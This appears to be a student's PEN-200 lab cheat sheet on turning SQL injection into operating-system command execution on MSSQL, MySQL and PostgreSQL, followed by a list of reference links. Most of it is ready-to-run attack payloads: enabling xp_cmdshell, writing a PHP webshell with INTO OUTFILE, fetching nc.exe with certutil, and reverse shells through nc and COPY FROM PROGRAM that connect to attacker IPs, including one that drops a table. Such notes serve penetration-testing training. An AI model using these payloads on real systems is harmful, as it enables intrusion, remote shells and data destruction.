## MSSQL 
```shell
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE; # RECONFIGURE applys the configuration against the SERVER

EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';
```

## MySQL
* MySQL doesn't offer a direct OS CMD function
* Requires File Location to be writeable to the OS user running the DB software
* Create a WebShell, via SQL Select, to writeable file location
* SQUID box used this

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
' # Results in 
<? system($_REQUEST['cmd']); ?>

http://<IP>/tmp/webshell.php?cmd=id # Execute via WEB

# Validate webshell works
curl "http://<IP>/tmp/webshell.php?cmd=whoami"  
# Stage NC on target
curl "http://<IP>/tmp/webshell.php?cmd=certutil+-urlcache+-f+http://192.168.45.167/nc.exe+nc.exe" 
# Connect back to our attacker
curl "http://<IP>/tmp/webshell.php?cmd=nc.exe+192.168.45.167+4441+-e+powershell.exe"  

PEN200 10.3.2 Q5
Inserting this into the DB
mail-list=' UNION SELECT  null, null, null, null, "<?php system($_GET['cmd']);?>", null INTO OUTFILE "/var/www/html/webshell.php" -- // 
In browser/curl/Burp
http://192.168.194.48/webshell.php?cmd=nc%20192.168.45.241%204444%20-e%20/bin/sh
```

## Postgress  
-  Pen-200 10.3.2 Q610.3.2 Q6  LAB had this SQLi blind injection
```
COPY shell FROM PROGRAM ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f’;

OS COMMAND INJECTION
Pen-200 10.3.2 Q6  LAB had this SQLi blind injections
weight=1&height='; DROP TABLE IF EXISTS commandexec ; CREATE TABLE commandexec(data text) ; COPY commandexec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/sh 192.168.45.245 443' ; -- 

Optionally URL encode with Burp, height was entry point for this SQLi
weight=1&height='%3bDROP+TABLE+IF+EXISTS+commandexec%3bCREATE+TABLE+commandexec(data+text)%3bCOPY+commandexec+FROM+PROGRAM+'/usr/bin/nc.traditional+-e+/bin/sh+192.168.45.241+4444'%3b--&age=24&gender=Male&email=test%40offsec.com  
```

---

## **Resources**
- https://www.offsec.com/blog/postgresql-exploit/
- https://book.hacktricks.wiki/en/pentesting-web/sql-injection/postgresql-injection/index.html
- https://pentestmonkey.net/category/cheat-sheet/sql-injection 
- https://www.advania.co.uk/blog/security/mysql-sql-injection-practical-cheat-sheet/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet 
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html 